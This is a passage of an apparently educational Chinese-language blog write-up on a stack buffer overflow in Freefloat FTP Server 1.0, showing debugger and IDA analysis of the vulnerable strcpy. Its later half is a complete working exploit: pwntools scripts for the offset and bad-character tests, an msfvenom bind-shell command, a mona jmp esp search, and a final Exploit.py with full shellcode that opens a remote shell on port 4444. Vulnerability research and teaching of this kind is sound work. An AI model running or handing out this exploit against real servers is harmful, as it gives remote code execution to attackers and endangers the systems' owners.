<h4 id="2-3-定位溢出点"><a href="#2-3-定位溢出点" class="headerlink" title="2.3 定位溢出点"></a>2.3 定位溢出点</h4><p>输入用户名之前，程序会输出一条ftp服务器版本的语句，在immunity debugger中定位输出这句话的函数，从而缩小定位漏洞函数的范围</p>
<p><img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/8.png?raw=true" alt="my-logo.png"></p>
<p>查询字符串</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/9.png?raw=true" style="zoom:80%">

<p>在wsprintw函数设置断点</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/10.png?raw=true" style="zoom:80%">

<p>重新发送payload，单步调试，直到运行到出现异常的函数freefloa.004020E0</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/11.png?raw=true" style="zoom:80%">

<p>在freefloa.004020E0函数设置断点，重新发送payload，f7单步步入此函数</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/12.png?raw=true" style="zoom:80%">

<p>重复上述操作，接着在freefloa.00402190函数设置断点，单步步入，程序会在运行到00402881处跳转到004028EB处执行，之后调用freefloa.00402DE0函数，程序崩溃</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/13.png?raw=true" style="zoom:80%">

<p>在freefloa.00402DE0函数设置断点，步入之后未发现存在子函数，并且在返回的时候执行retn 8指令</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/14.png?raw=true" style="zoom:80%">

<p>观察此时esp指向的返回地址为0x41414141，执行retn命令之后eip指向0x41414141，使得程序崩溃</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/15.png?raw=true" style="zoom:80%">

<p>得出结论：freefloa.00402DE0函数可能出现栈溢出</p>
<h4 id="2-4-静态分析结合动态分析"><a href="#2-4-静态分析结合动态分析" class="headerlink" title="2.4 静态分析结合动态分析"></a>2.4 静态分析结合动态分析</h4><p>用IDA加载程序进行静态分析，定位到函数sub_00402DE0</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/16.png?raw=true" style="zoom:80%">

<p>Strcpy函数存在溢出漏洞，将函数第三个参数a3的值复制到局部变量v8中，如果a3过长，会覆盖返回地址，那sub_00402DE0函数的参数a2，a3到底是什么？这就回溯到调用此函数的位置了，通过之前动态分析可以得到调用函数为00402190，IDA静态分析分析得Sub_00402190将输入的字符串与各种ftp命令进行比较，根据命令进行不同的响应。</p>
<p>用immunity debugger回溯到sub_00402190函数里的00402881地址，这个地址的指令跳转执行漏洞函数00402DE0，查看栈帧能够获得参数</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/18.png?raw=true" style="zoom:80%">

<p>在IDA中定位，aXommandNotUnde就是上图的command not understood字符串，此处跳转执行402DE0</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/19.png?raw=true" style="zoom:80%">

<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/20.png?raw=true" style="zoom:80%">

<p>参数1 V16是输入字符串长度，参数2 v17是输入字符串‘AAAA‘:command not understood’ 查看函数栈帧可验证</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/21.png?raw=true" style="zoom:80%">

<p>结论：函数sub_402DE0栈帧结构，（ebp实际不存在，只是方便记录相对偏移）</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/22.png?raw=true" style="zoom:80%">

<p>只需填充0xFC-1个垃圾数据可溢出到函数返回地址（-1是因为程序在输入字符串前添加了单引号），重新组织poc，返回地址为cccc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;192.168.112.146&quot;</span>, <span class="number">21</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*(<span class="number">0xfc</span>-<span class="number">1</span>) + <span class="string">&#x27;cccc&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>返回地址为0x63636363，是cccc的ascii码，验证成功</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/23.png?raw=true" style="zoom:80%">


<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h3><h4 id="1-利用条件"><a href="#1-利用条件" class="headerlink" title="1. 利用条件"></a>1. 利用条件</h4><p>Windows xp sp3未开启DEP保护</p>
<h4 id="2-利用过程"><a href="#2-利用过程" class="headerlink" title="2. 利用过程"></a>2. 利用过程</h4><h5 id="1-排除坏字符"><a href="#1-排除坏字符" class="headerlink" title="1. 排除坏字符"></a>1. 排除坏字符</h5><p>在生成shellcode之前需要确定坏字符，用mona生成一个0x00到0xff的bytearray，发送payload，比对哪个字符发送后会破坏payload，将其排除即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;192.168.112.146&#x27;</span>,<span class="number">21</span>)</span><br><span class="line"><span class="built_in">bytearray</span> = (</span><br><span class="line"><span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f&quot;</span></span><br><span class="line"><span class="string">&quot;\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;</span></span><br><span class="line"><span class="string">&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;</span></span><br><span class="line"><span class="string">&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;</span></span><br><span class="line"><span class="string">&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;</span></span><br><span class="line"><span class="string">&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xfc</span>-<span class="number">1</span>) + <span class="string">&#x27;cccc&#x27;</span> + <span class="built_in">bytearray</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h5 id="2-生成shellcode"><a href="#2-生成shellcode" class="headerlink" title="2. 生成shellcode"></a>2. 生成shellcode</h5><p>利用metasploit生成windows反弹shell的shellcode，排除坏数据’\x00\x0a\x0d’，以c语言格式输出，靶机IP192.168.112.146</p>
<p><code>msfvenom -p windows/shell_bind_tcp LHOSTS=192.168.112.146 LPORT=4444 -b &#39;\x00\x0a\x0d&#39; -f c</code></p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/24.png?raw=true" style="zoom:60%">

<h5 id="3-内存中查找jmp-esp命令"><a href="#3-内存中查找jmp-esp命令" class="headerlink" title="3. 内存中查找jmp esp命令"></a>3. 内存中查找jmp esp命令</h5><p>使用mona插件查询jmp esp指令的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">!mona jmp -r esp</span><br><span class="line"><span class="comment">#或者 </span></span><br><span class="line">!mona find -s <span class="string">&quot;\xff\xe4&quot;</span> -m</span><br></pre></td></tr></table></figure>

<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/25.png?raw=true" style="zoom:80%">

<p>从中选择一个地址0x77D29353，作为跳板，跳转到栈上执行shellcode</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/26.png?raw=true" style="zoom:80%">

<p>最终Exploit.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.112.146&#x27;</span>,<span class="number">21</span>)</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line"><span class="string">&quot;\xbf\xb9\x9b\xb3\x2f\xdb\xd2\xd9\x74\x24\xf4\x58\x33\xc9\xb1&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x31\x78\x12\x83\xc0\x04\x03\xc1\x95\x51\xda\xcd\x42\x17&quot;</span></span><br><span class="line"><span class="string">&quot;\x25\x2d\x93\x78\xaf\xc8\xa2\xb8\xcb\x99\x95\x08\x9f\xcf\x19&quot;</span></span><br><span class="line"><span class="string">&quot;\xe2\xcd\xfb\xaa\x86\xd9\x0c\x1a\x2c\x3c\x23\x9b\x1d\x7c\x22&quot;</span></span><br><span class="line"><span class="string">&quot;\x1f\x5c\x51\x84\x1e\xaf\xa4\xc5\x67\xd2\x45\x97\x30\x98\xf8&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x34\xd4\xc0\xac\x06\xf8\x40\x51\xde\xfb\x61\xc4\x54\xa2&quot;</span></span><br><span class="line"><span class="string">&quot;\xa1\xe7\xb9\xde\xeb\xff\xde\xdb\xa2\x74\x14\x97\x34\x5c\x64&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x9a\xa1\x48\xab\xe2\xe6\x6f\x54\x91\x1e\x8c\xe9\xa2\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\xee\x35\x26\xfd\x49\xbd\x90\xd9\x68\x12\x46\xaa\x67\xdf\x0c&quot;</span></span><br><span class="line"><span class="string">&quot;\xf4\x6b\xde\xc1\x8f\x90\x6b\xe4\x5f\x11\x2f\xc3\x7b\x79\xeb&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\xda\x27\x5a\x92\x3c\x88\x03\x36\x37\x25\x57\x4b\x1a\x22&quot;</span></span><br><span class="line"><span class="string">&quot;\x94\x66\xa4\xb2\xb2\xf1\xd7\x80\x1d\xaa\x7f\xa9\xd6\x74\x78&quot;</span></span><br><span class="line"><span class="string">&quot;\xce\xcc\xc1\x16\x31\xef\x31\x3f\xf6\xbb\x61\x57\xdf\xc3\xe9&quot;</span></span><br><span class="line"><span class="string">&quot;\xa7\xe0\x11\x87\xaf\x47\xca\xba\x52\x37\xba\x7a\xfc\xd0\xd0&quot;</span></span><br><span class="line"><span class="string">&quot;\x74\x23\xc0\xda\x5e\x4c\x69\x27\x61\x63\x36\xae\x87\xe9\xd6&quot;</span></span><br><span class="line"><span class="string">&quot;\xe6\x10\x85\x14\xdd\xa8\x32\x66\x37\x81\xd4\x2f\x51\x16\xdb&quot;</span></span><br><span class="line"><span class="string">&quot;\xaf\x77\x30\x4b\x24\x94\x84\x6a\x3b\xb1\xac\xfb\xac\x4f\x3d&quot;</span></span><br><span class="line"><span class="string">&quot;\x4e\x4c\x4f\x14\x38\xed\xc2\xf3\xb8\x78\xff\xab\xef\x2d\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xa2\x65\xc0\x68\x1c\x9b\x19\xec\x67\x1f\xc6\xcd\x66\x9e\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x4d\xb0\x55\x72\xc9\xe4\x09\x25\x87\x52\xec\x9f\x69\x0c&quot;</span></span><br><span class="line"><span class="string">&quot;\xa6\x4c\x20\xd8\x3f\xbf\xf3\x9e\x3f\xea\x85\x7e\xf1\x43\xd0&quot;</span></span><br><span class="line"><span class="string">&quot;\x81\x3e\x04\xd4\xfa\x22\xb4\x1b\xd1\xe6\xc4\x51\x7b\x4e\x4d&quot;</span></span><br><span class="line"><span class="string">&quot;\x3c\xee\xd2\x10\xbf\xc5\x11\x2d\x3c\xef\xe9\xca\x5c\x9a\xec&quot;</span></span><br><span class="line"><span class="string">&quot;\x97\xda\x77\x9d\x88\x8e\x77\x32\xa8\x9a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x77d29353 -&gt; jmp esp</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xfc</span>-<span class="number">1</span>) + <span class="string">&quot;\x53\x93\xd2\x77&quot;</span> + <span class="string">&quot;\x90&quot;</span>*<span class="number">16</span> + shellcode</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：shellcode前16个\x90是因为函数返回时的retn 8需要跳过，也可作为滑板，同时作为缓冲区防止执行shellcode时更改内存使得shellcode执行代码也被更改</p>
</blockquote>
<p>执行流程：</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/27.png?raw=true" style="zoom:80%">

<p>栈帧结构：</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/28.png?raw=true" style="zoom:80%">

<p>Shellcode使靶机开放4444端口进行shell连接攻击机，连接成功</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/29.png?raw=true" style="zoom:80%">

<h2 id="四、参考文献"><a href="#四、参考文献" class="headerlink" title="四、参考文献"></a>四、参考文献</h2><ul>
<li><a href="https://www.exploit-db.com/exploits/23243">https://www.exploit-db.com/exploits/23243</a></li>
<li><a href="https://giantbranch.blog.csdn.net/article/details/53291788">https://giantbranch.blog.csdn.net/article/details/53291788</a></li>
<li><a href="https://www.youtube.com/watch?v=i6Br57lh4uE">https://www.youtube.com/watch?v=i6Br57lh4uE</a></li>
<li><a href="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></li>
</ul>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>栈溢出</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
</search>
